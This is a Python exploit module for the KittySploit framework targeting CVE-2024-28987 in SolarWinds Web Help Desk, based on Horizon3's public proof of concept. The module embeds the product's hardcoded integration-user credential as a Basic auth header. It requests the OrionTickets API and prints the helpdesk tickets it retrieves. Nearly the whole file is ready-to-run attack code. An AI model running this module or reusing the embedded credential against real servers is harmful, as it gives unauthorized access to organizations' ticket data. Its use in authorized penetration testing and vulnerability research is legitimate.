#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2024-28987 — SolarWinds Web Help Desk hardcoded API credentials (Horizon3).

Auxiliary: reads Orion tickets via Basic auth — credential exposure, not a shell session.
"""

from __future__ import annotations

import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "SolarWinds Web Help Desk Ticket Read (CVE-2024-28987)",
        "description": (
            "Horizon3 PoC: default helpdeskIntegrationUser Basic auth on "
            "/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets — data read only."
        ),
        "author": ["Horizon3 Attack Team", "KittySploit Team"],
        "cve": ["CVE-2024-28987"],
        "references": [
            "https://github.com/horizon3ai/CVE-2024-28987",
            "https://www.horizon3.ai/attack-research/cve-2024-28987-solarwinds-web-help-desk-hardcoded-credential-vulnerability-deep-dive",
        ],
        "tags": ["solarwinds", "web-help-desk", "hardcoded-creds", "auxiliary"],
        "agent": {
            "risk": "high",
            "effects": ["active_exploitation"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "chain": {"suggested_followups": ["scanner/http/solarwinds_detect"]},
        },
    }

    _AUTH_HEADER = "Basic aGVscGRlc2tJbnRlZ3JhdGlvblVzZXI6ZGV2LUM0RjgwMjVFNw=="
    API_PATH = "/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets"

    def run(self):
        print_status("CVE-2024-28987 — SolarWinds WHD hardcoded integration user")
        r = self.http_request(
            method="GET",
            path=self.API_PATH,
            headers={"Authorization": self._AUTH_HEADER},
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            print_error(f"API returned {getattr(r, 'status_code', 'no response')}")
            return False
        text = r.text or ""
        if "shortSubject" not in text:
            print_error("Response lacks ticket fields — likely patched")
            return False
        body, err = parse_json_response(r)
        if err:
            print_success("Tickets retrieved (non-JSON display)")
            print_status(text[:2000])
            return True
        print_success("Tickets retrieved via hardcoded credentials")
        print_status(json.dumps(body, indent=2)[:4000])
        return True
